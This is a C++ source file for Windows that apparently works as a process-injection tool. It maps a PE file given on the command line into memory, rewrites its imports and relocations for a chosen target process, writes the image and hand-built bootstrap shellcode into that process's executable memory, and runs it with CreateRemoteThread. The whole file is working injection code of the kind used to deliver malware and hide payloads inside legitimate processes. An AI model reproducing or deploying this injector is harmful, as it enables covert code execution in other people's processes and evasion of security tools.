#include <Windows.h>

#include <stdio.h>

#include <psapi.h>

typedef struct {
    WORD offset : 12;
    WORD type : 4;
}
IMAGE_RELOC, * PIMAGE_RELOC;

#define DEREF(name) * (UINT_PTR * )(name)
#define DEREF_64(name) * (DWORD64 * )(name)
#define DEREF_32(name) * (DWORD * )(name)
#define DEREF_16(name) * (WORD * )(name)
#define DEREF_8(name) * (BYTE * )(name)

#define KERNEL32DLL_HASH 0x6A4ABC5B
#define NTDLLDLL_HASH 0x3CFA685D

#define LOADLIBRARYA_HASH 0xEC0E4E8E
#define GETPROCADDRESS_HASH 0x7C0DFCAA
#define VIRTUALALLOC_HASH 0x91AFCA54
#define NTFLUSHINSTRUCTIONCACHE_HASH 0x534C0AB8

typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes
{
    struct _PEB_FREE_BLOCK* pNext;
    DWORD dwSize;
}
PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef struct _UNICODE_STR {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
}
UNICODE_STR, * PUNICODE_STR;

typedef struct _PEB_LDR_DATA //, 7 elements, 0x28 bytes
{
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
}
PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct __PEB // 65 elements, 0x210 bytes
{
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
}
_PEB, * _PPEB;

typedef struct _LDR_DATA_TABLE_ENTRY {

    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
}
LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
typedef FARPROC(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
typedef LPVOID(WINAPI* VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef DWORD(NTAPI* NTFLUSHINSTRUCTIONCACHE)(HANDLE, PVOID, ULONG);

int main(int argc, char* argv[]) {

    HANDLE hFile = CreateFileA(
        argv[2], // File path
        GENERIC_READ, // Access mode (read)
        FILE_SHARE_READ, // Share mode (allow others to read)
        NULL, // Security attributes (default)
        OPEN_EXISTING, // Creation disposition (open only if it exists)
        FILE_ATTRIBUTE_NORMAL, // File attributes (normal)
        NULL // Template file (not used)
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error opening the file\n");
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        //fprintf(stderr, "Error getting file size\n");
        CloseHandle(hFile);
        return 1;
    }

    BYTE* byteArray = (BYTE*)malloc(fileSize);
    if (byteArray == NULL) {
        fprintf(stderr, "Error allocating memory\n");
        CloseHandle(hFile);
        return 1;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, byteArray, fileSize, &bytesRead, NULL)) {
        //fprintf(stderr, "Error reading from the file\n");
        CloseHandle(hFile);
        free(byteArray);
        return 1;
    }

    CloseHandle(hFile);

    printf("[+] successfully read %lu bytes from the file: %s\n", bytesRead, argv[2]);

    HANDLE target_hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, atoi(argv[1]));
    DWORD64 _target_process_kernel32_base_addr = 0;
    if (target_hProcess) {
        HMODULE hModuleArray[1024];
        DWORD cbNeeded;

        if (EnumProcessModules(target_hProcess, hModuleArray, sizeof(hModuleArray), &cbNeeded)) {
            for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
                char szModuleName[MAX_PATH];

                if (GetModuleFileNameExA(target_hProcess, hModuleArray[i], szModuleName, MAX_PATH)) {

                    char _fuckingstring[13] = "kernel32.dll";

                    int flag = 1;
                    for (int j = 0; j < 12; j++) {
                        if ((_fuckingstring[11 - j] != szModuleName[strlen(szModuleName) - 1 - j]) && (_fuckingstring[11 - j] - 32 != szModuleName[strlen(szModuleName) - 1 - j])) {
                            flag = 0;
                            break;

                        }
                    }
                    if (flag) {
                        _target_process_kernel32_base_addr = reinterpret_cast <DWORD64> ((char*)hModuleArray[i]);
                        break;
                    }
                }
            }
        }

        CloseHandle(target_hProcess);
    }
    else {
        printf("can not open target process, error code: %x\n", (unsigned int)GetLastError());
        return -1;
    }

    ULONG_PTR uiLibraryAddress = reinterpret_cast <DWORD64> (byteArray);
    ULONG_PTR uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

    ULONG_PTR uiBaseAddress = (ULONG_PTR)VirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    DWORD64 _pe_addr_load_in_current_process = uiBaseAddress;

    DWORD _memeoy_size_to_be_allocated_in_target_process = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage;
    printf("[*] 0x%p bytes will be allocated in target process\n", reinterpret_cast <DWORD64*> ((DWORD64)_memeoy_size_to_be_allocated_in_target_process));

    ULONG_PTR uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;

    ULONG_PTR uiValueB = uiLibraryAddress;
    ULONG_PTR uiValueC = uiBaseAddress; //这个是即将要加载到内存中的dll的基地址

    while (uiValueA--) // 根据headersize复制头部
        *
        (BYTE*)uiValueC++ = *(BYTE*)uiValueB++;

    uiValueA = reinterpret_cast <DWORD64> (&(((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader)) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader; // uiValueA是section header的地址

    ULONG_PTR uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
    while (uiValueE--) {

        uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress); // 拷贝section header的目的地址

        uiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData);

        ULONG_PTR uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;

        while (uiValueD--)
            *
            (BYTE*)uiValueB++ = *(BYTE*)uiValueC++;

        uiValueA += sizeof(IMAGE_SECTION_HEADER);
    }

    uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

    DWORD64 _current_process_kern32_base_addr = reinterpret_cast <DWORD64> (GetModuleHandleA("kernel32.dll"));

    while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name) {

        uiLibraryAddress = _current_process_kern32_base_addr;

        DWORD64 uiValueD = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk);

        uiValueA = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk);

        while (DEREF(uiValueA)) {

            if (uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG) {

                ULONG_PTR uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

                ULONG_PTR uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

                uiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);

                ULONG_PTR uiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);

                uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));

                DEREF(uiValueA) = (_target_process_kernel32_base_addr + DEREF_32(uiAddressArray));
            }
            else {

                uiValueB = (uiBaseAddress + DEREF(uiValueD));

                DWORD64 _____ashdjoajoidais = (ULONG_PTR)GetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);

                DWORD64 _tempoppapsdjioasdjhoiasjda = _____ashdjoajoidais - uiLibraryAddress + _target_process_kernel32_base_addr;

                *reinterpret_cast <DWORD64*> (uiValueA) = _tempoppapsdjioasdjhoiasjda;
            }

            uiValueA += sizeof(ULONG_PTR);
            if (uiValueD)
                uiValueD += sizeof(ULONG_PTR);
        }

        uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
    }

    HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, atoi(argv[1]));
    if (!hw) {
        printf("Process Not found (0x%lX)\n", GetLastError());
        return -1;
    }
    void* _real_base_in_target_process = VirtualAllocEx(hw, NULL, _memeoy_size_to_be_allocated_in_target_process, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    uiLibraryAddress = reinterpret_cast <DWORD64> (_real_base_in_target_process) - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

    uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size) {

        uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

        while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock) {

            uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress);

            uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

            DWORD64 uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

            while (uiValueB--) {

                if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64) {

                    *(ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;

                }
                else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)
                    *
                    (DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;

                else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH)
                    *
                    (WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
                else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW)
                    *
                    (WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

                uiValueD += sizeof(IMAGE_RELOC);
            }

            uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
        }
    }

    printf("[*] shellcode PE is loaded in current process memory, now copy it to target process memory\n");

    if (!WriteProcessMemory(hw, _real_base_in_target_process, reinterpret_cast <VOID*> (_pe_addr_load_in_current_process), _memeoy_size_to_be_allocated_in_target_process, NULL)) {
        printf("[-] process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
        return -1;
    }

    uiValueA = (reinterpret_cast <DWORD64> (_real_base_in_target_process) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
    printf("[*] this is the entry point in target process: 0x%p\n", reinterpret_cast <BYTE*> (uiValueA));

    printf("[*] now fill bootstrap code in target process memory, it will eventually call our entry point\n");
    void* _2_29bytes = VirtualAllocEx(hw, NULL, 29, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (0 == _2_29bytes) {
        printf("[-] memory alocate in target process failed, error code: 0x%x\n", (unsigned int)GetLastError());
        return -1;
    }
    BYTE _fuckyou1[12] = {
      0x56,
      0x48,
      0x8B,
      0xF4,
      0x48,
      0x83,
      0xE4,
      0xF0,
      0x48,
      0x83,
      0xEC,
      0x20
    };
    printf("[*] bootstrap code address in target process memory: %p\n", reinterpret_cast <BYTE*> (_2_29bytes));
    if (!WriteProcessMemory(hw, _2_29bytes, _fuckyou1, 12, NULL)) {
        printf("[-] process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
        return -1;
    }

    BYTE caonimadwozhendefue[2] = {
      0x48,
      0xb8
    };
    if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12, caonimadwozhendefue, 2, NULL)) {
        printf("[-] process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
        return -1;
    }

    if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2, &uiValueA, 8, NULL)) {
        printf("[-] process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
        return -1;
    }

    BYTE _CAL_RAX[2] = {
      0xFF,
      0xD0
    };
    if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2 + 8, _CAL_RAX, 2, NULL)) {
        printf("[-] process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
        return -1;
    }

    BYTE _CAL_RA___RET_X[5] = {
      0x48,
      0x8b,
      0xe6,
      0x5e,
      0xc3
    };
    if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2 + 8 + 2, _CAL_RA___RET_X, 5, NULL)) {
        printf("[-] process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
        return -1;
    }

    HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)_2_29bytes, NULL, 0, 0);
    if (!thread) {
        printf("[-] failed to create thread 0x%x\n", (unsigned int)GetLastError());
        CloseHandle(hw);
        return -1;
    }
    WaitForSingleObject(thread, INFINITE);

    if (!VirtualFreeEx(hw, reinterpret_cast <BYTE*> (_2_29bytes), 0, MEM_RELEASE)) {
        printf("[-] bootstrap code free fialed, %x\n", (unsigned int)GetLastError());
        return -1;
    }
    if (!VirtualFreeEx(hw, reinterpret_cast <BYTE*> (_real_base_in_target_process), 0, MEM_RELEASE)) {
        printf("[-] entry point free fialed, %x\n", (unsigned int)GetLastError());
        return -1;
    }
    printf("[+] target memory free successfully!\n");
}
